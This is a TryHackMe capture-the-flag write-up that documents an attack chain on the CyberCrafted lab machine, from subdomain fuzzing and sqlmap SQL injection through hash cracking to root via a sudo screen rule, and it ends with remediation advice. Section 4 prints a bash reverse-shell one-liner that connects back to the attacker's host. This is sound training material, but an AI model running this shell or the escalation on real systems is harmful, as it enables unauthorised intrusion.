# CyberCrafted

> **TryHackMe Room**: [CyberCrafted](https://tryhackme.com/room/cybercrafted)

A penetration test of the CyberCrafted machine, documented as a report. It covers reconnaissance, the exploitation chain from initial access to root, and remediation. Flags and specific credential values are not included. I note at the end where I relied on external resources rather than solving a step unaided.

## 1. Reconnaissance

An initial Nmap scan (`-sS -sC -Pn`) showed ports `22` (SSH) and `80` (HTTP) open, but the service count suggested more ports were in use. A broader scan with RustScan revealed a high port, `25565`, running a Minecraft server, which turned out to be thematically central to the box. (I had some trouble getting consistent results between RustScan and Nmap on repeated scans; worth noting as a tooling quirk rather than a finding.)

After adding `cybercrafted.thm` to `/etc/hosts`, directory enumeration with Gobuster found `/assets` and `/secret`, both containing only unused images, dead ends.

## 2. Finding: virtual host (subdomain) enumeration

Because the application used name-based virtual hosts, subdomain enumeration was required. Using `ffuf` with a `Host:` header fuzz and a size filter to remove false positives:

```bash
ffuf -w <wordlist> -u http://cybercrafted.thm -H "Host: FUZZ.cybercrafted.thm" -fs 0
```

This revealed the subdomains `admin`, `store`, and `www`, each added to `/etc/hosts`.

- `admin.cybercrafted.thm` served a login page (`login.php` / `index.php`). Basic SQL injection on the login form had no effect.
- `store.cybercrafted.thm` returned 403 at its root, but enumeration found `search.php`, accessible without authentication.

## 3. Finding: SQL injection on `store` → credentials

`search.php` was vulnerable to SQL injection. Using `sqlmap` against its form:

```bash
sqlmap --url http://store.cybercrafted.thm/search.php --forms --dump 
```

This dumped a database table containing a username, a password hash, and a web flag. The recovered hash was cracked offline (hashcat was slow for this hash type, so I used John the Ripper, which cracked it quickly).

Impact: an unauthenticated SQL injection exposed administrative credentials.

## 4. Initial access: admin panel → command execution → reverse shell

The cracked credentials logged into the admin panel, which exposed `panel.php`, a page that executed arbitrary Linux commands. I used it to launch a reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/<my-ip>/<port> 0>&1'
```

catching it with a `netcat` listener, landing on the host as the web user.

## 5. Lateral movement #1: readable SSH key

The host had two users of interest. One user’s home directory contained a `.ssh` folder with an encrypted `id_rsa` private key that was readable. I copied it off, converted it with `ssh2john`, cracked the passphrase with John (rockyou), and used the key to SSH in as that user.

Impact: an over-permissioned, passphrase-protected private key allowed lateral movement once the passphrase was cracked.

## 6. Lateral movement #2: plaintext credentials in a Minecraft plugin

Enumerating as that user, a cron job referenced `/opt/minecraft`, run as the `cybercrafted` user. Inside the Minecraft server’s `plugins` directory was a `LoginSystem` plugin folder containing `passwords.yml` (hashed) and, more usefully, `log.txt`, which contained the plaintext passwords for two accounts.

Using the recovered password, I switched to the `cybercrafted` user with `su` and read the user flag.

Impact: credentials stored in plaintext in an application log file enabled another lateral move.

## 7. Privilege escalation: sudo + GNU `screen`

`sudo -l` for `cybercrafted` showed:

```bash
(root) /usr/bin/screen -r cybercrafted
```

So `cybercrafted` could run `screen -r cybercrafted` as root. I was not familiar with exploiting `screen` this way, and ordinary commands inside the session did not help.

This is the step where I relied on an external write-up. It pointed out that, per the `screen` manual, the key combination `Ctrl-A` then `C` creates a new window with a shell inside the current session, and because the session was running as root, that new shell was a root shell. Using that, I obtained root and read the final flag.

Impact: a sudo rule allowing `screen` to attach to a root-owned session permitted a trivial breakout to a root shell.

## 8. Remediation

- SQL injection (`search.php`): use parameterized queries / prepared statements; do not build SQL from user input.
- Credential storage: never store plaintext passwords in logs (`log.txt`); hash passwords and keep secrets out of world- or group-readable application files.
- SSH private key: restrict key file permissions to the owner and avoid leaving crackable keys where other users can read them.
- Sudo `screen` rule: this grants effective root; remove it or replace it with a tightly constrained, non-interactive command. Interactive programs like `screen`, `vi`, and `less` should generally never be allowed through sudo.
- Virtual hosts: restrict or monitor access to `admin` and store `subdomains`; the `store` SQLi was reachable pre-authentication.

## 9. Notes and takeaways

This was a long, multi-stage chain: SQLi → cracked admin login → web command execution → reverse shell → readable SSH key → plaintext creds in a log → sudo `screen` to root. Areas I want to get more fluent in, based on where I struggled: subdomain enumeration with `ffuf`, and using `sqlmap` efficiently. The `screen` privilege escalation was new to me and the one step I did not work out independently; GTFOBins-style sudo abuses of interactive programs are a category worth studying directly so I recognize them next time.
